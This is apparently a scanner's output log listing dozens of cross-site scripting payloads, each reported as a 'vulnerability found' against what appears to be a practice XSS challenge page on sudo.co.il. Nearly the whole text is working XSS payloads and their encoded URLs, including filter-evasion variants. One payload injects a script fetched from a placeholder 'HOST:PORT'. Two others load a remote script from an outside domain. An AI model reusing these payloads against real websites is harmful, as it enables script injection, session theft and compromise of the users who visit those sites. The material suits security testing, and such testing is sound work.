+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+1%3D%221%22onxxx%3D1 with payload: <x 1="1"onxxx=1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+%3C%2Fonxxx%3D1 with payload: <x </onxxx=1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+1%3D%22%3E%22+onxxx%3D1 with payload: <x 1=">" onxxx=1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Chttp%3A%2F%2Fonxxx%253D1%2F with payload: <http://onxxx%3D1/
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+onxxx%3Dalert%281%29+1%3D%27 with payload: <x onxxx=alert(1) 1='
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Csvg+onload%3DsetInterval%28function%28%29%7Bwith%28document%29body.appendChild%28createElement%28%27script%27%29%29.src%3D%27%2F%2FHOST%3APORT%27%7D%2C0%29%3E with payload: <svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%27onload%3Dalert%281%29%3E%3Csvg%2F1%3D%27 with payload: 'onload=alert(1)><svg/1='
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%27%3Ealert%281%29%3C%2Fscript%3E%3Cscript%2F1%3D%27 with payload: '>alert(1)</script><script/1='
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%2A%2Falert%281%29%3C%2Fscript%3E%3Cscript%3E%2F%2A with payload: */alert(1)</script><script>/*
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%2A%2Falert%281%29%22%3E%27onload%3D%22%2F%2A%3Csvg%2F1%3D%27 with payload: */alert(1)">'onload="/*<svg/1='
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%60-alert%281%29%22%3E%27onload%3D%22%60%3Csvg%2F1%3D%27 with payload: `-alert(1)">'onload="`<svg/1='
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%2A%2F%3C%2Fscript%3E%27%3Ealert%281%29%2F%2A%3Cscript%2F1%3D%27 with payload: */</script>'>alert(1)/*<script/1='
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cscript%3Ealert%281%29%3C%2Fscript%3E with payload: <script>alert(1)</script>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cscript+src%3Djavascript%3Aalert%281%29%3E with payload: <script src=javascript:alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E with payload: <iframe src=javascript:alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cembed+src%3Djavascript%3Aalert%281%29%3E with payload: <embed src=javascript:alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Ca+href%3Djavascript%3Aalert%281%29%3Eclick with payload: <a href=javascript:alert(1)>click
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cmath%3E%3Cbrute+href%3Djavascript%3Aalert%281%29%3Eclick with payload: <math><brute href=javascript:alert(1)>click
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cform+action%3Djavascript%3Aalert%281%29%3E%3Cinput+type%3Dsubmit%3E with payload: <form action=javascript:alert(1)><input type=submit>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cisindex+action%3Djavascript%3Aalert%281%29+type%3Dsubmit+value%3Dclick%3E with payload: <isindex action=javascript:alert(1) type=submit value=click>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cform%3E%3Cbutton+formaction%3Djavascript%3Aalert%281%29%3Eclick with payload: <form><button formaction=javascript:alert(1)>click
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cform%3E%3Cinput+formaction%3Djavascript%3Aalert%281%29+type%3Dsubmit+value%3Dclick%3E with payload: <form><input formaction=javascript:alert(1) type=submit value=click>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cform%3E%3Cinput+formaction%3Djavascript%3Aalert%281%29+type%3Dimage+value%3Dclick%3E with payload: <form><input formaction=javascript:alert(1) type=image value=click>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cform%3E%3Cinput+formaction%3Djavascript%3Aalert%281%29+type%3Dimage+src%3DSOURCE%3E with payload: <form><input formaction=javascript:alert(1) type=image src=SOURCE>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cisindex+formaction%3Djavascript%3Aalert%281%29+type%3Dsubmit+value%3Dclick%3E with payload: <isindex formaction=javascript:alert(1) type=submit value=click>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cobject+data%3Djavascript%3Aalert%281%29%3E with payload: <object data=javascript:alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Ciframe+srcdoc%3D%3Csvg%2Fo%26%23x6Eload%26equals%3Balert%26lpar%3B1%29%26gt%3B%3E with payload: <iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Csvg%3E%3Cscript+xlink%3Ahref%3Ddata%3A%2Calert%281%29+%2F%3E with payload: <svg><script xlink:href=data:,alert(1) />
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cmath%3E%3Cbrute+xlink%3Ahref%3Djavascript%3Aalert%281%29%3Eclick with payload: <math><brute xlink:href=javascript:alert(1)>click
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Csvg%3E%3Ca+xmlns%3Axlink%3Dhttp%3A%2F%2Fwww.w3.org%2F1999%2Fxlink+xlink%3Ahref%3D%3F%3E%3Ccircle+r%3D400+%2F%3E%3Canimate+attributeName%3Dxlink%3Ahref+begin%3D0+from%3Djavascript%3Aalert%281%29+to%3D%26%3E with payload: <svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Chtml+ontouchstart%3Dalert%281%29%3E with payload: <html ontouchstart=alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Chtml+ontouchend%3Dalert%281%29%3E with payload: <html ontouchend=alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Chtml+ontouchmove%3Dalert%281%29%3E with payload: <html ontouchmove=alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Chtml+ontouchcancel%3Dalert%281%29%3E with payload: <html ontouchcancel=alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cbody+onorientationchange%3Dalert%281%29%3E with payload: <body onorientationchange=alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22%3E%3Cimg+src%3D1+onerror%3Dalert%281%29%3E.gif with payload: "><img src=1 onerror=alert(1)>.gif
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Csvg+xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22+onload%3D%22alert%28document.domain%29%22%2F%3E with payload: <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=GIF89a%2F%2A%3Csvg%2Fonload%3Dalert%281%29%3E%2A%2F%3Dalert%28document.domain%29%2F%2F%3B with payload: GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cscript+src%3D%22data%3A%26comma%3Balert%281%29%2F%2F with payload: <script src="data:&comma;alert(1)//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22%3E%3Cscript+src%3Ddata%3A%26comma%3Balert%281%29%2F%2F with payload: "><script src=data:&comma;alert(1)//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cscript+src%3D%22%2F%2Fbrutelogic.com.br%26sol%3B1.js%26num%3B with payload: <script src="//brutelogic.com.br&sol;1.js&num;
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22%3E%3Cscript+src%3D%2F%2Fbrutelogic.com.br%26sol%3B1.js%26num%3B with payload: "><script src=//brutelogic.com.br&sol;1.js&num;
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Clink+rel%3Dimport+href%3D%22data%3Atext%2Fhtml%26comma%3B%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%26sol%3Bscript%26gt%3B with payload: <link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22%3E%3Clink+rel%3Dimport+href%3Ddata%3Atext%2Fhtml%26comma%3B%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%26sol%3Bscript%26gt%3B with payload: "><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cbase+href%3D%2F%2F0%3E with payload: <base href=//0>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cscript%2Fsrc%3D%22data%3A%26comma%3Beval%28atob%28location.hash.slice%281%29%29%29%2F%2F%23alert%281%29 with payload: <script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cbody+onload%3Dalert%281%29%3E with payload: <body onload=alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cbody+onpageshow%3Dalert%281%29%3E with payload: <body onpageshow=alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cbody+onfocus%3Dalert%281%29%3E with payload: <body onfocus=alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cbody+onhashchange%3Dalert%281%29%3E%3Ca+href%3D%23x%3Eclick+this%21%23x with payload: <body onhashchange=alert(1)><a href=#x>click this!#x
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cbody+style%3Doverflow%3Aauto%3Bheight%3A1000px+onscroll%3Dalert%281%29+id%3Dx%3E%23x with payload: <body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cbody+onscroll%3Dalert%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E with payload: <body onscroll=alert(1)><br><br><br><br>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E with payload: <br><br><br><br><br><br><br><br><br><br>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E with payload: <br><br><br><br><br><br><br><br><br><br>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cx+id%3Dx%3E%23x with payload: <br><br><br><br><br><br><x id=x>#x
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cbody+onresize%3Dalert%281%29%3Epress+F12%21 with payload: <body onresize=alert(1)>press F12!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cbody+onhelp%3Dalert%281%29%3Epress+F1%21+%28MSIE%29 with payload: <body onhelp=alert(1)>press F1! (MSIE)
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cmarquee+onstart%3Dalert%281%29%3E with payload: <marquee onstart=alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cmarquee+loop%3D1+width%3D0+onfinish%3Dalert%281%29%3E with payload: <marquee loop=1 width=0 onfinish=alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Caudio+src+onloadstart%3Dalert%281%29%3E with payload: <audio src onloadstart=alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cvideo+onloadstart%3Dalert%281%29%3E%3Csource%3E with payload: <video onloadstart=alert(1)><source>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cinput+autofocus+onblur%3Dalert%281%29%3E with payload: <input autofocus onblur=alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Ckeygen+autofocus+onfocus%3Dalert%281%29%3E with payload: <keygen autofocus onfocus=alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cform+onsubmit%3Dalert%281%29%3E%3Cinput+type%3Dsubmit%3E with payload: <form onsubmit=alert(1)><input type=submit>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cselect+onchange%3Dalert%281%29%3E%3Coption%3E1%3Coption%3E2 with payload: <select onchange=alert(1)><option>1<option>2
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cmenu+id%3Dx+contextmenu%3Dx+onshow%3Dalert%281%29%3Eright+click+me%21 with payload: <menu id=x contextmenu=x onshow=alert(1)>right click me!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=alert%601%60 with payload: alert`1`
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=alert%26lpar%3B1%26rpar%3B with payload: alert&lpar;1&rpar;
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=alert%26%23x28%3B1%26%23x29 with payload: alert&#x28;1&#x29
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=alert%26%2340%3B1%26%2341 with payload: alert&#40;1&#41
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%28alert%29%281%29 with payload: (alert)(1)
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=a%3Dalert%2Ca%281%29 with payload: a=alert,a(1)
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%5B1%5D.find%28alert%29 with payload: [1].find(alert)
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=top%5B%22al%22%2B%22ert%22%5D%281%29 with payload: top["al"+"ert"](1)
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cscript%3Ealert%28%22hi%22%29%3B%3C%2Fscript%3E with payload: <script>alert("hi");</script>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22-prompt%288%29-%22 with payload: "-prompt(8)-"
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%27-prompt%288%29-%27 with payload: '-prompt(8)-'
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22%3Ba%3Dprompt%2Ca%28%29%2F%2F with payload: ";a=prompt,a()//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%27%3Ba%3Dprompt%2Ca%28%29%2F%2F with payload: ';a=prompt,a()//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%27-eval%28%22window%5B%27pro%27%252B%27mpt%27%5D%288%29%22%29-%27 with payload: '-eval("window['pro'%2B'mpt'](8)")-'
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22-eval%28%22window%5B%27pro%27%252B%27mpt%27%5D%288%29%22%29-%22 with payload: "-eval("window['pro'%2B'mpt'](8)")-"
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22onclick%3Dprompt%288%29%3E%22%40x.y with payload: "onclick=prompt(8)>"@x.y
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22onclick%3Dprompt%288%29%3E%3Csvg%2Fonload%3Dprompt%288%29%3E%22%40x.y with payload: "onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimage%2Fsrc%2Fonerror%3Dprompt%288%29%3E with payload: <image/src/onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimg%2Fsrc%2Fonerror%3Dprompt%288%29%3E with payload: <img/src/onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimage+src%2Fonerror%3Dprompt%288%29%3E with payload: <image src/onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimg+src%2Fonerror%3Dprompt%288%29%3E with payload: <img src/onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimage+src+%3Dq+onerror%3Dprompt%288%29%3E with payload: <image src =q onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimg+src+%3Dq+onerror%3Dprompt%288%29%3E with payload: <img src =q onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3C%2Fscrip%3C%2Fscript%3Et%3E%3Cimg+src+%3Dq+onerror%3Dprompt%288%29%3E with payload: </scrip</script>t><img src =q onerror=prompt(8)>
